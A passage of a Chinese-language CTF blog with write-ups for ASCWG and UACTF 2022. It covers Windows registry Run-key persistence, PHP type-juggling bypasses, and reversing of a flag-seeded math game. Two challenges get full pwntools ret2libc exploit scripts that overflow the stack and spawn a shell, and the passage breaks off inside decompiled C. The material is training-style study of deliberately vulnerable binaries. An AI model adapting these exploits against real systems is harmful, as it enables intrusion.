Ripper密码破解工具，词表选择rockyou.txt，很快就爆破出了密码。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153030.png" alt="4-3-3"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153054.png" alt="4-3-4"></p><pre class="line-numbers language-none"><code class="language-none">ASCWG&#123;M4C_4N6_1$_Co0l&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="4-4-Persistent-Ghost-Aha"><a href="#4-4-Persistent-Ghost-Aha" class="headerlink" title="4-4 Persistent Ghost [Aha!]"></a>4-4 <strong>Persistent Ghost [Aha!]</strong></h3><p>本题目是关于Windows下通过注册表持久化的题目，比赛时因为对注册表没有过多了解就跳过了。现在拿到Writeup之后转过头来研究一下。</p><p><strong>什么是注册表？</strong></p><p>注册表是Windows操作系统中的一个核心数据库，其中存放着各种参数，直接控制着Windows的启动、硬件驱动程序的装载以及一些Windows应用程序的运行，从而在整个系统中起着核心作用。这些作用包括了软、硬件的相关配置和状态信息，比如注册表中保存有应用程序和资源管理器外壳的初始条件、首选项和卸载数据等，联网计算机的整个系统的设置和各种许可，文件扩展名与应用程序的关联，硬件部件的描述、状态和属性，性能记录和其他底层的系统状态信息，以及其他数据等。</p><p><strong>注册表中的键根</strong></p><ul><li>HKEY_CLASSES_ROOT：启动应用程序所需的全部信息，如扩展名，应用程序与文档之间的关系，驱动程序名，DDE和OLE信息，类ID编号和应用程序与文档的图标等。</li><li>HKEY_CURRENT_USER：当前登录用户的配置信息，如环境变量，个人程序以及桌面设置等。</li><li>HKEY_LOCAL_MACHINE：本地计算机的系统信息，如硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息。</li><li>HKEY_USERS：计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问。</li><li>HKEY_CURRENT_CONFIG：当前硬件的配置信息，其中的信息是从HKEY_LOCAL_MACHINE中映射出来的。</li></ul><p>题目给出了HKEY_CURRENT_USER和HKEY_LOCAL_MACHINE中的信息，并且给出HKLM中的HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager信息存储到单独的Manager.txt中作为线索。</p><p>在Manager.txt我们可以发现一个被base64编码的png图片，如下所示。估计是暗示我们这是一个ribbit hole(新大陆)，flag应该以base64的方式存储在注册表中与持久化相关的键中。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153123.png" alt="4-4-1"></p><p>最终flag以base64编码的形式分成三段藏在以下三个值里。拼接后即可得到一段Python代码，运行后即可拿到flag。</p><pre class="line-numbers language-none"><code class="language-none">HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run HKEY_USERS\SOFTWARE\Microsoft\Windows\CurrentVersion\RunHKEY_USERS\SOFTWARE\Microsoft\Windows\CurrentVersion\Screensavers\ssText3d\Screen 3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/20220815153144.png" alt="4-4-2"></p><h2 id="5-OSINT"><a href="#5-OSINT" class="headerlink" title="5 OSINT"></a>5 OSINT</h2><p><a href="https://medium.com/@drv1us/ascwg-2022-ctf-qualifications-osint-challenges-writeup-cb21f270eb66">https://medium.com/@drv1us/ascwg-2022-ctf-qualifications-osint-challenges-writeup-cb21f270eb66</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 比赛 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>UACTF 2022比赛的WriteUp</title>
      <link href="/2022/08/15/uactf-2022-writeup/"/>
      <url>/2022/08/15/uactf-2022-writeup/</url>
      
        <content type="html"><![CDATA[<p>简介：</p><p>本文为UACTF 2022比赛的WriteUp。本次还是与NING0121、meishijia一起组队参赛，最终在447支参赛队伍中排名21位。打怪升级中，再接再厉～</p><span id="more"></span><p>说明：本WriteUp中标志[Aha!]是赛后总结并参考其他师傅的WriteUp完成的，毕竟没有做出来的题更要记录学习。</p><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a><strong>Web</strong></h2><h3 id="1-1-Trial-by-PHP"><a href="#1-1-Trial-by-PHP" class="headerlink" title="1-1 Trial by PHP"></a><strong>1-1 Trial by PHP</strong></h3><p>基础的 PHP 绕过技术。（题目中间有段时间提供了 php 脚本源码）</p><p>题目要求我们达到它所需要我们实现的三个目标，开始并没有思路，没有什么交互按钮，因此就尝试查看 robots.txt，发现存在 secret-source.php 文件。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/SYFwFZuYoVBUlNe4eJ8wdQ.png" alt="1"></p><p>接着进行访问，阅读逻辑后发现需要实现三个 success 才能够显示出 flag，于是首先尝试直接修改 html 的标签（果然异想天开），接着就需要首先三个条件。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-3.png" alt="2"></p><ol><li>超短 hash<br> 要求 ：md5_hash 后 == 0。<br> 思考：首先了解 == 的含义，hash_hmac 绕过方式。<br> 解决：由于 “==” 只判断值相同，因此我们只需要让 hash_hmac 返回 NULL即可，经查询发现 php 无法处理数组数据，因此只需要让 egg 为数组即可；</li><li>长度大于 hash<br> 要求：字符串加密长度 &lt; 字符串长度。<br> 思考：abs 的接收参数？<br> 解决：由于abs为绝对值函数，当输入字符串数据会返回0，进而生成的的 hash 为 “MA==”，长度为4，因此我们只需要赋值一个长于4字符的字符串即可。</li><li>获得参数但是避免特殊符号<br> 要求：既要获得“THROUGH_A_TRAP_LADEN_MAZE”参数，同时不能包含“_”。<br> 思考：开始想着通过二次URL编码绕过，后来发现不行。<br> 解决：’ . ‘ 在经过 $_GET 后会变成  ‘ _ ‘。</li></ol><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-1-4.png" alt="3"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;17’5_13v1054_n07_13v105444&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-2-Juggler"><a href="#1-2-Juggler" class="headerlink" title="1-2 Juggler"></a><strong>1-2 Juggler</strong></h3><p>基础的 PHP 绕过技术。题目提供了验证的源码。</p><p>很明显我们需要绕过以下两部分内容，关键在于不知道 $secret 和 $password 两个参数。针对 $secret 我们很明显能通过 hash 后进行二次赋值，因此我们需要对 nonce 参数进行处理，因为 php 无法处理数组参数，因此我们构造 nonce 参数即可使函数返回 0，接着由于已知 username 为 admin，于此同时我们便获得了固定的 hmac 参数；第二要解决的就是 strcmp 问题，虽然不知道 $password 但是同样使用数组类型数据，便可以满足条件；</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-1.png" alt="4"></p><p>使用 burpsuite 拦截并修改数据如下即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/1-2-2.png" alt="5"></p><p>页面打印出了 flag。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/RhUs09PxOqfzokWQDGm_zg.png" alt="6"></p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;jugg1e_this_y0u_fi1thy_casua1&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="1-3-Unhackable-Code-Runner-Aha"><a href="#1-3-Unhackable-Code-Runner-Aha" class="headerlink" title="1-3 Unhackable Code Runner [Aha!]"></a><strong>1-3 Unhackable Code Runner [Aha!]</strong></h3><p><a href="https://github.com/milan338/CTF-Writeups/tree/main/UACTF_2022">https://github.com/milan338/CTF-Writeups/tree/main/UACTF_2022</a></p><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a><strong>Pwn</strong></h2><h3 id="2-1-something-something-win"><a href="#2-1-something-something-win" class="headerlink" title="2-1 something-something-win"></a><strong>2-1 something-something-win</strong></h3><p>基础的栈溢出题目。</p><p>查看汇编代码，mian函数中会调用sussy函数，sussy函数中存在通过read读入的栈溢出漏洞，代码中存在敏感的win函数，其功能是打开flag文件。</p><p>由于Sussy函数中会对栈的内容进行判断并以此为条件进行跳转，否则会直接exit。所以我们需要将栈以要求的方式填充，再最后将win函数的地址覆盖到栈中的ret位置。最终成功拿到Flag。</p><pre class="line-numbers language-none"><code class="language-none">UACTF&#123;R3T_70_D33Z&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="2-2-Warmup"><a href="#2-2-Warmup" class="headerlink" title="2-2 Warmup"></a><strong>2-2 Warmup</strong></h3><p>这是一道典型的ret2libc题目，题目给出了warmup可执行文件以及编译所用的libc。通过checksec可以看到其仅开启了NX保护措施。</p><p>通过反编译软件Ghidra的分析，我们可以看到程序逻辑：首先判断check1()函数的返回值是否为0，若不为0则进入do_stuff函数。其中check1函数和do_stuff函数如下所示。do_stuff函数中打印了puts函数在内存中的地址，并且存在read函数的栈溢出漏洞。所以我们的利用步骤是首先使得check1函数的返回值不为0，再根据打印的puts函数地址以及给出的glibc获取system以及”/bin/sh”字符串在内存中的地址，最后构造ROP链ret2libc获取shell。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/LuaUPWbAGEdOkaVaQg2Ymg.png" alt="7"></p><p>仅通过反汇编的代码我们试图使check1的返回值为0似乎是不可能的，所以我们还需要研究汇编代码。按照函数调用惯例，64位机器编译的程序的返回值优先被置于RAX寄存器中。同时，通过main函数中调用check1函数返回下一条语句，我们也可以看到其对EAX(RAX的低4字节)进行判断是否为0。所以我们需要关注Check1函数中RAX最后值的变化。该函数中，我们通过scanf(‘%lu’, &amp;input)获取一个unsigned long型，接着通过XMM0以及XMM1寄存器的一系列指令对RAX的值进行修改。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/w6zMVJ9M6MTfqBH0RVoIig.png" alt="8"></p><p>具体的指令说明如下所示。一个unsigned long型使用8字节表示，最大值为2^64-1，所以我们只需要使得scanf的输入超过此值为NULL即可。</p><pre class="line-numbers language-none"><code class="language-none"># 将RBP+8字节(double类型)地址的大小为64bit(8字节)的值赋给XMMO寄存器；MOVSD XMM0, qword ptr[RBP+input]# 判断两寄存器的值是否存在NULL，并对ZF，IF，CF寄存器赋值；# 参考https:&#x2F;&#x2F;www.felixcloutier.com&#x2F;x86&#x2F;ucomisdUCOMISD XMM0，XMM1# 如果PF寄存器为1，则对AL赋值为1；SETP AL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>进入do_stuff函数之后，我们只需要获取在glibc中被动态加载的system以及/bin/sh字符串的地址即可。对于给定的glibc库文件，其内部函数的偏移是固定的，但是其基地址需要被leak出来。真正程序执行时，glibc库函数在内存中的地址为库基地址+库内固定偏移。对于前者的计算，我们通过程序实际运行时某执行过的glibc库函数的实际地址(%p, put或printf泄漏)-其库内固定偏移获得。对于后者，在给定libc的情况，对于函数，我们可以通过<code>readelf -s /lib/x86_64-linux-gnu/libc.so.6 |grep &quot;system@@GLIBC_2.2.5&quot;</code>指令或者pwntools中ELF(‘./libc-2.31.so’).symbols[‘system’]来获取；对于字符串，我们通过<code>ROPgadget --binary mypwn --string &#39;/bin/sh&#39;</code>或者pwntools中调用<code>next(sh.search(&quot;/bin/sh&quot;))</code>来获取。</p><p>此外，在gdb运行时，我们可以通过命令<code>info proc map</code>来获取内存映射，然后通过`</p><p>info address system<code>和</code>find 0x80048000, 0xc0000000, “/bin/sh”`来查找函数和字符串来验证我们构造的地址是否正确。以上指令非常常用，所以在此记录一下。</p><p>然而，在获得system以及”/bin/sh”后构造ROP链，成功在本地kali上获得shell，但是远程总是无法打通。后来查阅到，在部分x86_64机器上，system函数调用会遇到movasp issue。原因是glibc中的库函数会使用到movaps指令，该指令用于数据传输但要求栈结构必须是16字节对齐的(这也是64位机器的函数调用惯例)。但是我们的ROP链的构造是以8字节为单位，所以可能会遇到该问题报错。解决方案是在ROP链中添加额外的ret指令使得栈16字节对齐或者跳过system函数开头的push指令即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/gxBQBJeZKthbMtE3oWIpRg.png" alt="9"></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2-2-1.png" alt="10"></p><p>完整的Exp如下所示。</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"xx.xx.xx.xx"</span><span class="token punctuation">,</span><span class="token number">30005</span><span class="token punctuation">)</span><span class="token comment"># try to entry the while loop</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Enter the pincode: "</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'123456789012345678901234567890'</span><span class="token punctuation">)</span><span class="token comment"># receive the leaked address of puts function</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"Uhm, not sure what is happening tbh.."</span><span class="token punctuation">)</span>sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b"\nI'm just going to help you out the tinyest bit.. "</span><span class="token punctuation">)</span>libc_puts_addr_d <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"received the puts addr: %s"</span><span class="token punctuation">,</span> libc_puts_addr_d<span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF('/lib/x86_64-linux-gnu/libc-2.33.so')</span>libc_puts_addr_s <span class="token operator">=</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>libc_base_addr <span class="token operator">=</span> libc_puts_addr_d <span class="token operator">-</span> libc_puts_addr_ssystem_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>binsh_addr <span class="token operator">=</span> libc_base_addr <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">)</span>pop_rdi_addr <span class="token operator">=</span> <span class="token number">0x401255</span>ret_addr <span class="token operator">=</span> <span class="token number">0x40101a</span> <span class="token comment"># to solve the movaps issue</span>payload <span class="token operator">=</span> <span class="token string">b'A'</span><span class="token operator">*</span><span class="token number">56</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-No-no-no-square"><a href="#2-3-No-no-no-square" class="headerlink" title="2-3 No no no square"></a><strong>2-3 No no no square</strong></h3><p>No no no square程序和warmup一致，均为ret2libc。但是Nonosquare中并没有打印出puts函数的地址，所以需要我们利用栈溢出来得到。</p><p>由于程序执行时调用了puts函数，所以利用思路就是：第一次栈溢出调用puts函数泄漏出GOT表中puts函数的全局偏移并最后跳转到main函数的开头；第二次栈溢出利用计算好的system函数以及/bin/sh字符串的地址完成ret2libc。</p><p>具体的来讲，动态链接的程序是如何装载到内存空间并运行的之后会详细地出一篇博客来详细地介绍。具体的Exp如下所示。</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *sh &#x3D; remote(&quot;xx.xx.xx.xx&quot;,30003)# try to entry the while loopsh.recvuntil(b&quot;This is going to be fun... is it?&quot;)nonosquare &#x3D; ELF(&#39;.&#x2F;nonosquare&#39;)puts_plt &#x3D; nonosquare.plt[&#39;puts&#39;] # 0x405000puts_got &#x3D; nonosquare.got[&#39;puts&#39;]main &#x3D; nonosquare.symbols[&#39;main&#39;]pop_rdi_addr &#x3D; 0x401343 # pop rdi; ret;payload &#x3D; b&#39;A&#39;*56 + p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt) + p64(main)print(&quot;[*]Sending the first payload and leak the puts addr %s&quot; % payload)sh.sendline(payload)sh.recvuntil(b&quot;no no no&quot;)sh.recvuntil(b&quot;Did you have fun?&quot;)sh.recvuntil(b&quot;\n&quot;)libc_puts_addr_d &#x3D; u64(sh.recv()[:6].ljust(8,b&#39;\x00&#39;)) # 不足8字节补充print(libc_puts_addr_d)print(&quot;[*]Received the puts addr in libc: %d&quot; % libc_puts_addr_d)# sh.recvuntil(b&quot;This is going to be fun... is it?&quot;)# sh.recvuntil(b&quot;no no no&quot;)# sh.recvuntil(b&quot;Did you have fun?&quot;)libc &#x3D; ELF(&#39;.&#x2F;libc-2.31.so&#39;)libc_start_main_addr_s &#x3D; libc.symbols[&#39;puts&#39;]libc_base_addr &#x3D; libc_puts_addr_d - libc_start_main_addr_ssystem_addr &#x3D; libc_base_addr + libc.symbols[&#39;system&#39;]binsh_addr &#x3D; libc_base_addr + next(libc.search(b&quot;&#x2F;bin&#x2F;sh&quot;))ret_addr &#x3D; 0x40101a # to solve the movaps issuepayload &#x3D; b&#39;A&#39;*56 + p64(ret_addr) + p64(pop_rdi_addr) + p64(binsh_addr) + p64(system_addr)print(&quot;[*]Sending the second payload: %s&quot; % payload)sh.sendline(payload)sh.recvuntil(b&quot;no no no&quot;)sh.recvuntil(b&quot;Did you have fun?&quot;)sh.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/2-3-2.png" alt="11"></p><h3 id="2-4-Evil-Eval-Aha"><a href="#2-4-Evil-Eval-Aha" class="headerlink" title="2-4 Evil Eval [Aha!]"></a><strong>2-4 Evil Eval [Aha!]</strong></h3><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/nPRd3TLyFMCDf-S1gkhaCg.jpeg" alt="12"></p><h2 id="Reversing"><a href="#Reversing" class="headerlink" title="Reversing"></a><strong>Reversing</strong></h2><h3 id="3-1-Sanity-Check"><a href="#3-1-Sanity-Check" class="headerlink" title="3-1 Sanity Check"></a><strong>3-1 Sanity Check</strong></h3><p>逆向的第一道题，直接使用逆向工具打开即可。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/dnuchhhOzEH1SUkK4IxdTw.png" alt="13">    </p><h3 id="3-2-MASON-Aha"><a href="#3-2-MASON-Aha" class="headerlink" title="3-2 MASON[Aha!]"></a><strong>3-2 MASON</strong><strong>[Aha!]</strong></h3><p>题目提供了ELF程序，该程序通过读取flag.txt中的字符串，并以该字符串作为种子，产生随机数生成加法公式。思路在于，通过交互程序首先判断字符串的长度并记录随机产生的数字，随后根据这些随机产生的数字，利用程序爆破的方式对原字符串进行还原。</p><p><strong>主函数逻辑</strong></p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/sdGz0iLYlrDRW3HbY-DLsQ.png" alt="14">     </p><p>读取flag.txt文件中的字符串</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/WI_JGGuyjQESWemayXrc9w.png" alt="15">        </p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/0L_WvOZqD1D1jUi7MfoJaw.png" alt="16"> </p><p>reseed函数是读取字符串的四个字符，并以他们在内存当中的数据作为随机数产生的种子。__int64 s就是字符串的首地址，DWORD是双字，也就是四个字节，即四个字符。该函数，就相当于以首地址为基址，以4*i为偏移，大小为四个字节的字符串作为随机数产生的种子。</p><p><img src="https://laoba-1304292449.cos.ap-chengdu.myqcloud.com/img/q2ZI1sUX3Ru4eR-ZUn0rWw.png" alt="17"></p><p>l1 函数即根据产生的字符串构造随机的加法公式，并计算结果。同时判断后续用户输入的结果是否为正确答案。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">bool <span class="token function">l1</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token class-name">size_t</span> v1<span class="token punctuation">;</span> <span class="token comment">// rax</span>  <span class="token keyword">int</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-2B0h]</span>  <span class="token keyword">int</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+4h] [rbp-2ACh]</span>  <span class="token keyword">char</span> <span class="token operator">*</span>endptr<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-2A8h] BYREF</span>  __int64 v6<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-2A0h]</span>  __int64 v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-298h]</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-290h] BYREF</span>  __int64 v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+28h] [rbp-288h]</span>  __int64 v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-280h]</span>  __int64 v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+38h] [rbp-278h]</span>  __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-270h]</span>  __int64 v13<span class="token punctuation">;</span> <span class="token comment">// [rsp+48h] [rbp-268h]</span>  __int64 v14<span class="token punctuation">;</span> <span class="token comment">// [rsp+50h] [rbp-260h]</span>  __int64 v15<span class="token punctuation">;</span> <span class="token comment">// [rsp+58h] [rbp-258h]</span>  __int64 v16<span class="token punctuation">;</span> <span class="token comment">// [rsp+60h] [rbp-250h]</span>  __int64 v17<span class="token punctuation">;</span> <span class="token comment">// [rsp+68h] [rbp-248h]</span>  __int64 v18<span class="token punctuation">;</span> <span class="token comment">// [rsp+70h] [rbp-240h]</span>  __int64 v19<span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp-238h]</span>  __int64 v20<span class="token punctuation">;</span> <span class="token comment">// [rsp+80h] [rbp-230h]</span>  __int64 v21<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-228h]</span>  __int64 v22<span class="token punctuation">;</span> <span class="token comment">// [rsp+90h] [rbp-220h]</span>  __int64 v23<span class="token punctuation">;</span> <span class="token comment">// [rsp+98h] [rbp-218h]</span>  <span class="token keyword">char</span> dest<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+A0h] [rbp-210h] BYREF</span>  __int64 v25<span class="token punctuation">;</span> <span class="token comment">// [rsp+A8h] [rbp-208h]</span>  <span class="token keyword">char</span> v26<span class="token punctuation">[</span><span class="token number">496</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+B0h] [rbp-200h] BYREF</span>  <span class="token keyword">unsigned</span> __int64 v27<span class="token punctuation">;</span> <span class="token comment">// [rsp+2A8h] [rbp-8h]</span>  v27 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v3 <span class="token operator">=</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">6</span> <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token comment">//  2, 4,6,8,10,12。决定加法的项数</span>  v6 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>dest <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  v25 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token function">memset</span><span class="token punctuation">(</span>v26<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>v26<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    v4 <span class="token operator">=</span> <span class="token function">rand</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">0x1000000</span><span class="token punctuation">;</span>                    <span class="token comment">// 0-63</span>    <span class="token operator">*</span><span class="token punctuation">(</span>_QWORD <span class="token operator">*</span><span class="token punctuation">)</span>s <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v9 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v10 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v11 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v12 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v13 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v14 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v15 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v16 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v17 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v18 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v19 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v20 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v21 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v22 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    v23 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">&lt;=</span> <span class="token number">1</span> <span class="token punctuation">)</span>      v0 <span class="token operator">=</span> <span class="token string">"= ?"</span><span class="token punctuation">;</span>    <span class="token keyword">else</span>      v0 <span class="token operator">=</span> <span class="token string">"+"</span><span class="token punctuation">;</span>    <span class="token function">sprintf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"%d %s "</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>v4<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">strcat</span><span class="token punctuation">(</span>dest<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>    v6 <span class="token operator">+=</span> v4<span class="token punctuation">;</span>    <span class="token operator">--</span>v3<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span> v3 <span class="token operator">></span> <span class="token number">0</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>  v7 <span class="token operator">=</span> <span class="token number">0LL</span><span class="token punctuation">;</span>  <span class="token keyword">do</span>  <span class="token punctuation">&#123;</span>    <span class="token function">puts</span><span class="token punctuation">(</span>dest<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span><span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">128</span><span class="token punctuation">,</span> _bss_start<span class="token punctuation">)</span> <span class="token punctuation">)</span>      <span class="token keyword">break</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">1</span> <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      s<span class="token punctuation">[</span><span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token 